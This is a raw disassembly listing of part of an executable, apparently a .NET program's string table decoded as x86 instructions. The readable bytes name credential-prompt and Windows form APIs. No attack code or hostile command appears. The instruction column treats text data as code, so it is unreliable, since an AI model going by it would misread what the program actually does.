  407bcb:	6e                   	outsb  %ds:(%esi),(%dx)
  407bcc:	64 6c                	fs insb (%dx),%es:(%edi)
  407bce:	65 00 68 46          	add    %ch,%gs:0x46(%eax)
  407bd2:	69 6c 65 00 64 65 73 	imul   $0x63736564,0x0(%ebp,%eiz,2),%ebp
  407bd9:	63 
  407bda:	72 69                	jb     0x407c45
  407bdc:	70 74                	jo     0x407c52
  407bde:	69 6f 6e 73 00 63 68 	imul   $0x68630073,0x6e(%edi),%ebp
  407be5:	6f                   	outsl  %ds:(%esi),(%dx)
  407be6:	69 63 65 73 00 64 65 	imul   $0x65640073,0x65(%ebx),%esp
  407bed:	66 61                	popaw
  407bef:	75 6c                	jne    0x407c5d
  407bf1:	74 43                	je     0x407c36
  407bf3:	68 6f 69 63 65       	push   $0x6563696f
  407bf8:	00 61 6c             	add    %ah,0x6c(%ecx)
  407bfb:	6c                   	insb   (%dx),%es:(%edi)
  407bfc:	6f                   	outsl  %ds:(%esi),(%dx)
  407bfd:	77 65                	ja     0x407c64
  407bff:	64 43                	fs inc %ebx
  407c01:	72 65                	jb     0x407c68
  407c03:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407c06:	74 69                	je     0x407c71
  407c08:	61                   	popa
  407c09:	6c                   	insb   (%dx),%es:(%edi)
  407c0a:	54                   	push   %esp
  407c0b:	79 70                	jns    0x407c7d
  407c0d:	65 73 00             	gs jae 0x407c10
  407c10:	66 6f                	outsw  %ds:(%esi),(%dx)
  407c12:	72 65                	jb     0x407c79
  407c14:	67 72 6f             	addr16 jb 0x407c86
  407c17:	75 6e                	jne    0x407c87
  407c19:	64 43                	fs inc %ebx
  407c1b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c1c:	6c                   	insb   (%dx),%es:(%edi)
  407c1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407c1e:	72 00                	jb     0x407c20
  407c20:	62 61 63             	bound  %esp,0x63(%ecx)
  407c23:	6b 67 72 6f          	imul   $0x6f,0x72(%edi),%esp
  407c27:	75 6e                	jne    0x407c97
  407c29:	64 43                	fs inc %ebx
  407c2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2c:	6c                   	insb   (%dx),%es:(%edi)
  407c2d:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2e:	72 00                	jb     0x407c30
  407c30:	73 6f                	jae    0x407ca1
  407c32:	75 72                	jne    0x407ca6
  407c34:	63 65 49             	arpl   %esp,0x49(%ebp)
  407c37:	64 00 72 65          	add    %dh,%fs:0x65(%edx)
  407c3b:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407c3e:	64 00 61 70          	add    %ah,%fs:0x70(%ecx)
  407c42:	70 00                	jo     0x407c44
  407c44:	61                   	popa
  407c45:	72 67                	jb     0x407cae
  407c47:	73 00                	jae    0x407c49
  407c49:	53                   	push   %ebx
  407c4a:	79 73                	jns    0x407cbf
  407c4c:	74 65                	je     0x407cb3
  407c4e:	6d                   	insl   (%dx),%es:(%edi)
  407c4f:	2e 52                	cs push %edx
  407c51:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  407c54:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407c59:	6e                   	outsb  %ds:(%esi),(%dx)
  407c5a:	00 41 73             	add    %al,0x73(%ecx)
  407c5d:	73 65                	jae    0x407cc4
  407c5f:	6d                   	insl   (%dx),%es:(%edi)
  407c60:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407c64:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  407c6b:	72 
  407c6c:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407c73:	73 73                	jae    0x407ce8
  407c75:	65 6d                	gs insl (%dx),%es:(%edi)
  407c77:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  407c7b:	72 6f                	jb     0x407cec
  407c7d:	64 75 63             	fs jne 0x407ce3
  407c80:	74 41                	je     0x407cc3
  407c82:	74 74                	je     0x407cf8
  407c84:	72 69                	jb     0x407cef
  407c86:	62 75 74             	bound  %esi,0x74(%ebp)
  407c89:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407c8d:	73 65                	jae    0x407cf4
  407c8f:	6d                   	insl   (%dx),%es:(%edi)
  407c90:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407c94:	6f                   	outsl  %ds:(%esi),(%dx)
  407c95:	70 79                	jo     0x407d10
  407c97:	72 69                	jb     0x407d02
  407c99:	67 68 74 41 74 74    	addr16 push $0x74744174
  407c9f:	72 69                	jb     0x407d0a
  407ca1:	62 75 74             	bound  %esi,0x74(%ebp)
  407ca4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407ca8:	73 65                	jae    0x407d0f
  407caa:	6d                   	insl   (%dx),%es:(%edi)
  407cab:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407caf:	72 61                	jb     0x407d12
  407cb1:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  407cb4:	61                   	popa
  407cb5:	72 6b                	jb     0x407d22
  407cb7:	41                   	inc    %ecx
  407cb8:	74 74                	je     0x407d2e
  407cba:	72 69                	jb     0x407d25
  407cbc:	62 75 74             	bound  %esi,0x74(%ebp)
  407cbf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407cc3:	73 65                	jae    0x407d2a
  407cc5:	6d                   	insl   (%dx),%es:(%edi)
  407cc6:	62 6c 79 56          	bound  %ebp,0x56(%ecx,%edi,2)
  407cca:	65 72 73             	gs jb  0x407d40
  407ccd:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407cd4:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407cdb:	73 73                	jae    0x407d50
  407cdd:	65 6d                	gs insl (%dx),%es:(%edi)
  407cdf:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  407ce3:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  407cea:	69 
  407ceb:	6f                   	outsl  %ds:(%esi),(%dx)
  407cec:	6e                   	outsb  %ds:(%esi),(%dx)
  407ced:	41                   	inc    %ecx
  407cee:	74 74                	je     0x407d64
  407cf0:	72 69                	jb     0x407d5b
  407cf2:	62 75 74             	bound  %esi,0x74(%ebp)
  407cf5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407cf9:	73 65                	jae    0x407d60
  407cfb:	6d                   	insl   (%dx),%es:(%edi)
  407cfc:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  407d00:	65 73 63             	gs jae 0x407d66
  407d03:	72 69                	jb     0x407d6e
  407d05:	70 74                	jo     0x407d7b
  407d07:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407d0e:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407d15:	73 73                	jae    0x407d8a
  407d17:	65 6d                	gs insl (%dx),%es:(%edi)
  407d19:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407d1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407d1e:	6d                   	insl   (%dx),%es:(%edi)
  407d1f:	70 61                	jo     0x407d82
  407d21:	6e                   	outsb  %ds:(%esi),(%dx)
  407d22:	79 41                	jns    0x407d65
  407d24:	74 74                	je     0x407d9a
  407d26:	72 69                	jb     0x407d91
  407d28:	62 75 74             	bound  %esi,0x74(%ebp)
  407d2b:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407d2f:	73 74                	jae    0x407da5
  407d31:	65 6d                	gs insl (%dx),%es:(%edi)
  407d33:	2e 52                	cs push %edx
  407d35:	75 6e                	jne    0x407da5
  407d37:	74 69                	je     0x407da2
  407d39:	6d                   	insl   (%dx),%es:(%edi)
  407d3a:	65 2e 43             	gs cs inc %ebx
  407d3d:	6f                   	outsl  %ds:(%esi),(%dx)
  407d3e:	6d                   	insl   (%dx),%es:(%edi)
  407d3f:	70 69                	jo     0x407daa
  407d41:	6c                   	insb   (%dx),%es:(%edi)
  407d42:	65 72 53             	gs jb  0x407d98
  407d45:	65 72 76             	gs jb  0x407dbe
  407d48:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  407d4f:	6d                   	insl   (%dx),%es:(%edi)
  407d50:	70 69                	jo     0x407dbb
  407d52:	6c                   	insb   (%dx),%es:(%edi)
  407d53:	61                   	popa
  407d54:	74 69                	je     0x407dbf
  407d56:	6f                   	outsl  %ds:(%esi),(%dx)
  407d57:	6e                   	outsb  %ds:(%esi),(%dx)
  407d58:	52                   	push   %edx
  407d59:	65 6c                	gs insb (%dx),%es:(%edi)
  407d5b:	61                   	popa
  407d5c:	78 61                	js     0x407dbf
  407d5e:	74 69                	je     0x407dc9
  407d60:	6f                   	outsl  %ds:(%esi),(%dx)
  407d61:	6e                   	outsb  %ds:(%esi),(%dx)
  407d62:	73 41                	jae    0x407da5
  407d64:	74 74                	je     0x407dda
  407d66:	72 69                	jb     0x407dd1
  407d68:	62 75 74             	bound  %esi,0x74(%ebp)
  407d6b:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407d6f:	6e                   	outsb  %ds:(%esi),(%dx)
  407d70:	74 69                	je     0x407ddb
  407d72:	6d                   	insl   (%dx),%es:(%edi)
  407d73:	65 43                	gs inc %ebx
  407d75:	6f                   	outsl  %ds:(%esi),(%dx)
  407d76:	6d                   	insl   (%dx),%es:(%edi)
  407d77:	70 61                	jo     0x407dda
  407d79:	74 69                	je     0x407de4
  407d7b:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  407d7e:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  407d85:	69 
  407d86:	62 75 74             	bound  %esi,0x74(%ebp)
  407d89:	65 00 37             	add    %dh,%gs:(%edi)
  407d8c:	76 79                	jbe    0x407e07
  407d8e:	73 36                	jae    0x407dc6
  407d90:	30 78 32             	xor    %bh,0x32(%eax)
  407d93:	7a 00                	jp     0x407d95
  407d95:	44                   	inc    %esp
  407d96:	6c                   	insb   (%dx),%es:(%edi)
  407d97:	6c                   	insb   (%dx),%es:(%edi)
  407d98:	49                   	dec    %ecx
  407d99:	6d                   	insl   (%dx),%es:(%edi)
  407d9a:	70 6f                	jo     0x407e0b
  407d9c:	72 74                	jb     0x407e12
  407d9e:	41                   	inc    %ecx
  407d9f:	74 74                	je     0x407e15
  407da1:	72 69                	jb     0x407e0c
  407da3:	62 75 74             	bound  %esi,0x74(%ebp)
  407da6:	65 00 63 72          	add    %ah,%gs:0x72(%ebx)
  407daa:	65 64 75 69          	gs fs jne 0x407e17
  407dae:	00 53 74             	add    %dl,0x74(%ebx)
  407db1:	72 69                	jb     0x407e1c
  407db3:	6e                   	outsb  %ds:(%esi),(%dx)
  407db4:	67 00 49 73          	add    %cl,0x73(%bx,%di)
  407db8:	4e                   	dec    %esi
  407db9:	75 6c                	jne    0x407e27
  407dbb:	6c                   	insb   (%dx),%es:(%edi)
  407dbc:	4f                   	dec    %edi
  407dbd:	72 45                	jb     0x407e04
  407dbf:	6d                   	insl   (%dx),%es:(%edi)
  407dc0:	70 74                	jo     0x407e36
  407dc2:	79 00                	jns    0x407dc4
  407dc4:	4d                   	dec    %ebp
  407dc5:	61                   	popa
  407dc6:	72 73                	jb     0x407e3b
  407dc8:	68 61 6c 00 53       	push   $0x53006c61
  407dcd:	69 7a 65 4f 66 00 49 	imul   $0x4900664f,0x65(%edx),%edi
  407dd4:	6e                   	outsb  %ds:(%esi),(%dx)
  407dd5:	74 50                	je     0x407e27
  407dd7:	74 72                	je     0x407e4b
  407dd9:	00 5a 65             	add    %bl,0x65(%edx)
  407ddc:	72 6f                	jb     0x407e4d
  407dde:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  407de2:	74 72                	je     0x407e56
  407de4:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  407deb:	75 63                	jne    0x407e50
  407ded:	74 4c                	je     0x407e3b
  407def:	61                   	popa
  407df0:	79 6f                	jns    0x407e61
  407df2:	75 74                	jne    0x407e68
  407df4:	41                   	inc    %ecx
  407df5:	74 74                	je     0x407e6b
  407df7:	72 69                	jb     0x407e62
  407df9:	62 75 74             	bound  %esi,0x74(%ebp)
  407dfc:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  407e01:	6f                   	outsl  %ds:(%esi),(%dx)
  407e02:	75 74                	jne    0x407e78
  407e04:	4b                   	dec    %ebx
  407e05:	69 6e 64 00 46 6c 61 	imul   $0x616c4600,0x64(%esi),%ebp
  407e0c:	67 73 41             	addr16 jae 0x407e50
  407e0f:	74 74                	je     0x407e85
  407e11:	72 69                	jb     0x407e7c
  407e13:	62 75 74             	bound  %esi,0x74(%ebp)
  407e16:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  407e1a:	70 74                	jo     0x407e90
  407e1c:	79 00                	jns    0x407e1e
  407e1e:	43                   	inc    %ebx
  407e1f:	6c                   	insb   (%dx),%es:(%edi)
  407e20:	6f                   	outsl  %ds:(%esi),(%dx)
  407e21:	73 65                	jae    0x407e88
  407e23:	00 73 65             	add    %dh,0x65(%ebx)
  407e26:	74 5f                	je     0x407e87
  407e28:	4f                   	dec    %edi
  407e29:	70 61                	jo     0x407e8c
  407e2b:	63 69 74             	arpl   %ebp,0x74(%ecx)
  407e2e:	79 00                	jns    0x407e30
  407e30:	73 65                	jae    0x407e97
  407e32:	74 5f                	je     0x407e93
  407e34:	53                   	push   %ebx
  407e35:	68 6f 77 49 6e       	push   $0x6e49776f
  407e3a:	54                   	push   %esp
  407e3b:	61                   	popa
  407e3c:	73 6b                	jae    0x407ea9
  407e3e:	62 61 72             	bound  %esp,0x72(%ecx)
  407e41:	00 43 6f             	add    %al,0x6f(%ebx)
  407e44:	6e                   	outsb  %ds:(%esi),(%dx)
  407e45:	74 72                	je     0x407eb9
  407e47:	6f                   	outsl  %ds:(%esi),(%dx)
  407e48:	6c                   	insb   (%dx),%es:(%edi)
  407e49:	00 73 65             	add    %dh,0x65(%ebx)
  407e4c:	74 5f                	je     0x407ead
  407e4e:	56                   	push   %esi
  407e4f:	69 73 69 62 6c 65 00 	imul   $0x656c62,0x69(%ebx),%esi
  407e56:	67 65 74 5f          	addr16 gs je 0x407eb9
  407e5a:	42                   	inc    %edx
  407e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e5c:	74 74                	je     0x407ed2
  407e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  407e5f:	6d                   	insl   (%dx),%es:(%edi)
  407e60:	00 67 65             	add    %ah,0x65(%edi)
  407e63:	74 5f                	je     0x407ec4
  407e65:	54                   	push   %esp
  407e66:	6f                   	outsl  %ds:(%esi),(%dx)
  407e67:	70 00                	jo     0x407e69
  407e69:	67 65 74 5f          	addr16 gs je 0x407ecc
  407e6d:	52                   	push   %edx
  407e6e:	69 67 68 74 00 67 65 	imul   $0x65670074,0x68(%edi),%esp
  407e75:	74 5f                	je     0x407ed6
  407e77:	4c                   	dec    %esp
  407e78:	65 66 74 00          	gs data16 je 0x407e7c
  407e7c:	41                   	inc    %ecx
  407e7d:	64 64 72 65          	fs fs jb 0x407ee6
  407e81:	73 73                	jae    0x407ef6
  407e83:	00 42 75             	add    %al,0x75(%edx)
  407e86:	66 66 65 72 43       	data16 data16 gs jb 0x407ece
  407e8b:	65 6c                	gs insb (%dx),%es:(%edi)
  407e8d:	6c                   	insb   (%dx),%es:(%edi)
  407e8e:	54                   	push   %esp
  407e8f:	79 70                	jns    0x407f01
  407e91:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407e95:	74 5f                	je     0x407ef6
  407e97:	58                   	pop    %eax
  407e98:	00 73 65             	add    %dh,0x65(%ebx)
  407e9b:	74 5f                	je     0x407efc
  407e9d:	59                   	pop    %ecx
  407e9e:	00 73 65             	add    %dh,0x65(%ebx)
  407ea1:	74 5f                	je     0x407f02
  407ea3:	48                   	dec    %eax
  407ea4:	65 69 67 68 74 00 73 	imul   $0x65730074,%gs:0x68(%edi),%esp
  407eab:	65 
  407eac:	74 5f                	je     0x407f0d
  407eae:	57                   	push   %edi
  407eaf:	69 64 74 68 00 41 70 	imul   $0x70704100,0x68(%esp,%esi,2),%esp
  407eb6:	70 
  407eb7:	44                   	inc    %esp
  407eb8:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb9:	6d                   	insl   (%dx),%es:(%edi)
  407eba:	61                   	popa
  407ebb:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  407ec2:	43                   	inc    %ebx
  407ec3:	75 72                	jne    0x407f37
  407ec5:	72 65                	jb     0x407f2c
  407ec7:	6e                   	outsb  %ds:(%esi),(%dx)
  407ec8:	74 44                	je     0x407f0e
  407eca:	6f                   	outsl  %ds:(%esi),(%dx)
  407ecb:	6d                   	insl   (%dx),%es:(%edi)
  407ecc:	61                   	popa
  407ecd:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  407ed4:	46                   	inc    %esi
  407ed5:	72 69                	jb     0x407f40
  407ed7:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ed9:	64 6c                	fs insb (%dx),%es:(%edi)
  407edb:	79 4e                	jns    0x407f2b
  407edd:	61                   	popa
  407ede:	6d                   	insl   (%dx),%es:(%edi)
  407edf:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  407ee3:	65 72 33             	gs jb  0x407f19
  407ee6:	32 2e                	xor    (%esi),%ch
  407ee8:	64 6c                	fs insb (%dx),%es:(%edi)
  407eea:	6c                   	insb   (%dx),%es:(%edi)
  407eeb:	00 53 69             	add    %dl,0x69(%ebx)
  407eee:	7a 65                	jp     0x407f55
  407ef0:	46                   	inc    %esi
  407ef1:	00 43 6f             	add    %al,0x6f(%ebx)
  407ef4:	6e                   	outsb  %ds:(%esi),(%dx)
  407ef5:	74 61                	je     0x407f58
  407ef7:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%esi),%ebp
  407efe:	74 72                	je     0x407f72
  407f00:	6f                   	outsl  %ds:(%esi),(%dx)
  407f01:	6c                   	insb   (%dx),%es:(%edi)
  407f02:	00 73 65             	add    %dh,0x65(%ebx)
  407f05:	74 5f                	je     0x407f66
  407f07:	41                   	inc    %ecx
  407f08:	75 74                	jne    0x407f7e
  407f0a:	6f                   	outsl  %ds:(%esi),(%dx)
  407f0b:	53                   	push   %ebx
  407f0c:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407f0f:	65 44                	gs inc %esp
  407f11:	69 6d 65 6e 73 69 6f 	imul   $0x6f69736e,0x65(%ebp),%ebp
  407f18:	6e                   	outsb  %ds:(%esi),(%dx)
  407f19:	73 00                	jae    0x407f1b
  407f1b:	41                   	inc    %ecx
  407f1c:	75 74                	jne    0x407f92
  407f1e:	6f                   	outsl  %ds:(%esi),(%dx)
  407f1f:	53                   	push   %ebx
  407f20:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407f23:	65 4d                	gs dec %ebp
  407f25:	6f                   	outsl  %ds:(%esi),(%dx)
  407f26:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  407f2b:	74 5f                	je     0x407f8c
  407f2d:	41                   	inc    %ecx
  407f2e:	75 74                	jne    0x407fa4
  407f30:	6f                   	outsl  %ds:(%esi),(%dx)
  407f31:	53                   	push   %ebx
  407f32:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407f35:	65 4d                	gs dec %ebp
  407f37:	6f                   	outsl  %ds:(%esi),(%dx)
  407f38:	64 65 00 54 65 78    	fs add %dl,%gs:0x78(%ebp,%eiz,2)
  407f3e:	74 42                	je     0x407f82
  407f40:	6f                   	outsl  %ds:(%esi),(%dx)
  407f41:	78 00                	js     0x407f43
  407f43:	42                   	inc    %edx
  407f44:	75 74                	jne    0x407fba
  407f46:	74 6f                	je     0x407fb7
  407f48:	6e                   	outsb  %ds:(%esi),(%dx)
  407f49:	00 73 65             	add    %dh,0x65(%ebx)
  407f4c:	74 5f                	je     0x407fad
  407f4e:	54                   	push   %esp
  407f4f:	65 78 74             	gs js  0x407fc6
  407f52:	00 50 6f             	add    %dl,0x6f(%eax)
  407f55:	69 6e 74 00 73 65 74 	imul   $0x74657300,0x74(%esi),%ebp
  407f5c:	5f                   	pop    %edi
  407f5d:	4c                   	dec    %esp
  407f5e:	6f                   	outsl  %ds:(%esi),(%dx)
  407f5f:	63 61 74             	arpl   %esp,0x74(%ecx)
  407f62:	69 6f 6e 00 53 63 72 	imul   $0x72635300,0x6e(%edi),%ebp
  407f69:	65 65 6e             	gs outsb %gs:(%esi),(%dx)
  407f6c:	00 46 72             	add    %al,0x72(%esi)
  407f6f:	6f                   	outsl  %ds:(%esi),(%dx)
  407f70:	6d                   	insl   (%dx),%es:(%edi)
  407f71:	43                   	inc    %ebx
  407f72:	6f                   	outsl  %ds:(%esi),(%dx)
  407f73:	6e                   	outsb  %ds:(%esi),(%dx)
  407f74:	74 72                	je     0x407fe8
  407f76:	6f                   	outsl  %ds:(%esi),(%dx)
  407f77:	6c                   	insb   (%dx),%es:(%edi)
  407f78:	00 67 65             	add    %ah,0x65(%edi)
  407f7b:	74 5f                	je     0x407fdc
  407f7d:	42                   	inc    %edx
  407f7e:	6f                   	outsl  %ds:(%esi),(%dx)
  407f7f:	75 6e                	jne    0x407fef
  407f81:	64 73 00             	fs jae 0x407f84
  407f84:	67 65 74 5f          	addr16 gs je 0x407fe7
  407f88:	57                   	push   %edi
  407f89:	69 64 74 68 00 73 65 	imul   $0x74657300,0x68(%esp,%esi,2),%esp
  407f90:	74 
  407f91:	5f                   	pop    %edi
  407f92:	4d                   	dec    %ebp
  407f93:	61                   	popa
  407f94:	78 69                	js     0x407fff
  407f96:	6d                   	insl   (%dx),%es:(%edi)
  407f97:	75 6d                	jne    0x408006
  407f99:	53                   	push   %ebx
  407f9a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407fa1:	5f                   	pop    %edi
  407fa2:	41                   	inc    %ecx
  407fa3:	75 74                	jne    0x408019
  407fa5:	6f                   	outsl  %ds:(%esi),(%dx)
  407fa6:	53                   	push   %ebx
  407fa7:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  407fae:	74 72                	je     0x408022
  407fb0:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb1:	6c                   	insb   (%dx),%es:(%edi)
  407fb2:	43                   	inc    %ebx
  407fb3:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb4:	6c                   	insb   (%dx),%es:(%edi)
  407fb5:	6c                   	insb   (%dx),%es:(%edi)
  407fb6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407fbb:	6e                   	outsb  %ds:(%esi),(%dx)
  407fbc:	00 67 65             	add    %ah,0x65(%edi)
  407fbf:	74 5f                	je     0x408020
  407fc1:	43                   	inc    %ebx
  407fc2:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc3:	6e                   	outsb  %ds:(%esi),(%dx)
  407fc4:	74 72                	je     0x408038
  407fc6:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc7:	6c                   	insb   (%dx),%es:(%edi)
  407fc8:	73 00                	jae    0x407fca
  407fca:	41                   	inc    %ecx
  407fcb:	64 64 00 73 65       	fs add %dh,%fs:0x65(%ebx)
  407fd0:	74 5f                	je     0x408031
  407fd2:	55                   	push   %ebp
  407fd3:	73 65                	jae    0x40803a
  407fd5:	53                   	push   %ebx
  407fd6:	79 73                	jns    0x40804b
  407fd8:	74 65                	je     0x40803f
  407fda:	6d                   	insl   (%dx),%es:(%edi)
  407fdb:	50                   	push   %eax
  407fdc:	61                   	popa
  407fdd:	73 73                	jae    0x408052
  407fdf:	77 6f                	ja     0x408050
  407fe1:	72 64                	jb     0x408047
  407fe3:	43                   	inc    %ebx
  407fe4:	68 61 72 00 53       	push   $0x53007261
  407fe9:	65 74 42             	gs je  0x40802e
  407fec:	6f                   	outsl  %ds:(%esi),(%dx)
  407fed:	75 6e                	jne    0x40805d
  407fef:	64 73 00             	fs jae 0x407ff2
  407ff2:	50                   	push   %eax
  407ff3:	74 72                	je     0x408067
  407ff5:	54                   	push   %esp
  407ff6:	6f                   	outsl  %ds:(%esi),(%dx)
  407ff7:	53                   	push   %ebx
  407ff8:	74 72                	je     0x40806c
  407ffa:	69 6e 67 55 6e 69 00 	imul   $0x696e55,0x67(%esi),%ebp
  408001:	73 65                	jae    0x408068
  408003:	74 5f                	je     0x408064
  408005:	44                   	inc    %esp
  408006:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  40800d:	73 75                	jae    0x408084
  40800f:	6c                   	insb   (%dx),%es:(%edi)
  408010:	74 00                	je     0x408012
  408012:	4d                   	dec    %ebp
  408013:	61                   	popa
  408014:	74 68                	je     0x40807e
  408016:	00 4d 61             	add    %cl,0x61(%ebp)
  408019:	78 00                	js     0x40801b
  40801b:	73 65                	jae    0x408082
  40801d:	74 5f                	je     0x40807e
  40801f:	43                   	inc    %ebx
  408020:	6c                   	insb   (%dx),%es:(%edi)
  408021:	69 65 6e 74 53 69 7a 	imul   $0x7a695374,0x6e(%ebp),%esp
  408028:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  40802c:	64 52                	fs push %edx
  40802e:	61                   	popa
  40802f:	6e                   	outsb  %ds:(%esi),(%dx)
  408030:	67 65 00 46 6f       	add    %al,%gs:0x6f(%bp)
  408035:	72 6d                	jb     0x4080a4
  408037:	42                   	inc    %edx
  408038:	6f                   	outsl  %ds:(%esi),(%dx)
  408039:	72 64                	jb     0x40809f
  40803b:	65 72 53             	gs jb  0x408091
  40803e:	74 79                	je     0x4080b9
  408040:	6c                   	insb   (%dx),%es:(%edi)
  408041:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408045:	74 5f                	je     0x4080a6
  408047:	46                   	inc    %esi
  408048:	6f                   	outsl  %ds:(%esi),(%dx)
  408049:	72 6d                	jb     0x4080b8
  40804b:	42                   	inc    %edx
  40804c:	6f                   	outsl  %ds:(%esi),(%dx)
  40804d:	72 64                	jb     0x4080b3
  40804f:	65 72 53             	gs jb  0x4080a5
  408052:	74 79                	je     0x4080cd
  408054:	6c                   	insb   (%dx),%es:(%edi)
  408055:	65 00 46 6f          	add    %al,%gs:0x6f(%esi)
  408059:	72 6d                	jb     0x4080c8
  40805b:	53                   	push   %ebx
  40805c:	74 61                	je     0x4080bf
  40805e:	72 74                	jb     0x4080d4
  408060:	50                   	push   %eax
  408061:	6f                   	outsl  %ds:(%esi),(%dx)
  408062:	73 69                	jae    0x4080cd
  408064:	74 69                	je     0x4080cf
  408066:	6f                   	outsl  %ds:(%esi),(%dx)
  408067:	6e                   	outsb  %ds:(%esi),(%dx)
  408068:	00 73 65             	add    %dh,0x65(%ebx)
  40806b:	74 5f                	je     0x4080cc
  40806d:	53                   	push   %ebx
  40806e:	74 61                	je     0x4080d1
  408070:	72 74                	jb     0x4080e6
  408072:	50                   	push   %eax
  408073:	6f                   	outsl  %ds:(%esi),(%dx)
  408074:	73 69                	jae    0x4080df
  408076:	74 69                	je     0x4080e1
  408078:	6f                   	outsl  %ds:(%esi),(%dx)
  408079:	6e                   	outsb  %ds:(%esi),(%dx)
  40807a:	00 41 73             	add    %al,0x73(%ecx)
  40807d:	73 65                	jae    0x4080e4
  40807f:	6d                   	insl   (%dx),%es:(%edi)
  408080:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  408084:	47                   	inc    %edi
  408085:	65 74 45             	gs je  0x4080cd
  408088:	78 65                	js     0x4080ef
  40808a:	63 75 74             	arpl   %esi,0x74(%ebp)
  40808d:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  408094:	6d                   	insl   (%dx),%es:(%edi)
  408095:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  408099:	67 65 74 5f          	addr16 gs je 0x4080fc
  40809d:	4c                   	dec    %esp
  40809e:	6f                   	outsl  %ds:(%esi),(%dx)
  40809f:	63 61 74             	arpl   %esp,0x74(%ecx)
  4080a2:	69 6f 6e 00 49 63 6f 	imul   $0x6f634900,0x6e(%edi),%ebp
  4080a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4080aa:	00 45 78             	add    %al,0x78(%ebp)
  4080ad:	74 72                	je     0x408121
  4080af:	61                   	popa
  4080b0:	63 74 41 73          	arpl   %esi,0x73(%ecx,%eax,2)
  4080b4:	73 6f                	jae    0x408125
  4080b6:	63 69 61             	arpl   %ebp,0x61(%ecx)
  4080b9:	74 65                	je     0x408120
  4080bb:	64 49                	fs dec %ecx
  4080bd:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4080c0:	00 73 65             	add    %dh,0x65(%ebx)
  4080c3:	74 5f                	je     0x408124
  4080c5:	49                   	dec    %ecx
  4080c6:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4080c9:	00 73 65             	add    %dh,0x65(%ebx)
  4080cc:	74 5f                	je     0x40812d
  4080ce:	4d                   	dec    %ebp
  4080cf:	69 6e 69 6d 69 7a 65 	imul   $0x657a696d,0x69(%esi),%ebp
  4080d6:	42                   	inc    %edx
  4080d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4080d8:	78 00                	js     0x4080da
  4080da:	73 65                	jae    0x408141
  4080dc:	74 5f                	je     0x40813d
  4080de:	4d                   	dec    %ebp
  4080df:	61                   	popa
  4080e0:	78 69                	js     0x40814b
